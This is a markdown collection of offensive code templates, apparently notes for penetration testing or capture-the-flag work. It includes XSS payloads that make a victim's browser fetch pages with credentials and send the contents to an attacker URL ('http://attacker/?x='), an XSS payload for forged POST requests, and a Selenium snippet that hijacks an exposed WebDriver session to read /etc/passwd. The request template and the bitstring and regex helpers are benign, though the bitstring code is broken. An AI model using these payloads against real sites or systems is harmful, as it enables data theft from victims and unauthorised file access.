# Templates

### Post request with session

```python
import requests
import re

http_proxy  = "http://127.0.0.1:8080"
proxyDict = { 
              "http"  : http_proxy, 
            }
 # get a session
r = requests.get('http://')
# send request
r = requests.post('<url>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
```

### XSS web request on behalf of victim, sending complete webpage back

```javascript
xhr = new XMLHttpRequest();
xhr.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", '<our_url>?'+xhr.response);
  x.send(null);
}
xhr.open("GET", '<target_url>');
xhr.send(null);
```

Alternative using fetch:

```javascript
fetch('http://target', { credentials: 'include'}).then(res=>res.text()).then((r)=>fetch("http://attacker/?x="/*+btoa(r)*/,{credentials: 'include', "method":"POST", "body":btoa(r)}));
```

### XSS post request on behalf of the victim, with custom cookies

```javascript
var xhr = new XMLHttpRequest();
document.cookie = "key=value;";
var uri ="<target uri>";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("<post body>");
```

### Manipulate bitstring

```python
# Convert bit string to byte array
def bitstring_to_bytes(s):
    v = int(s, 2)
    b = bytearray()
    while v:
        b.append(v & 0xff)
        v >>= 8
    return bytes(b[::-1])

base = "010101..." # the bit string
n = 8 # change something every n bits
result = ""
# Iterate over bitstring, doing something  every n bits
for i in xrange(n,len(base)-n,n):
    # do manipulation here
    result += num
print(bitstring_to_bytes(result))
```

### Named capture groups

```python
m = re.search('[e]\s:\s(?P<e>\d+){0,1}',text.decode('utf-8'))
  if m != None and 'e' in m.groupdict():
    e = int(m.group('e'))
```

### Use Selenium to read local files

```python
'''
curl -d '{"capabilities": {"firstMatch": [{"browserName": "firefox", "moz:firefoxOptions": {"args": [ "-headless"], "log": {"level": "trace"}}}]}}' http://127.0.0.1:41145/session
'''
from selenium import webdriver
from selenium.webdriver.remote.webdriver import WebDriver

def attach_to_session(executor_url, session_id):
    original_execute = WebDriver.execute
    def new_command_execute(self, command, params=None):
        if command == "newSession":
            return {'success': 0, 'value': None, 'sessionId': session_id}
        else:
            return original_execute(self, command, params)
    WebDriver.execute = new_command_execute
    driver = webdriver.Remote(command_executor=executor_url, desired_capabilities={})
    driver.session_id = session_id
    WebDriver.execute = original_execute
    return driver

bro = attach_to_session('http://127.0.0.1:41145', 'bb2d2142-8a61-446b-9bcc-16751ce20b49')
bro.get('file:///etc/passwd')
print(bro.page_source)
```



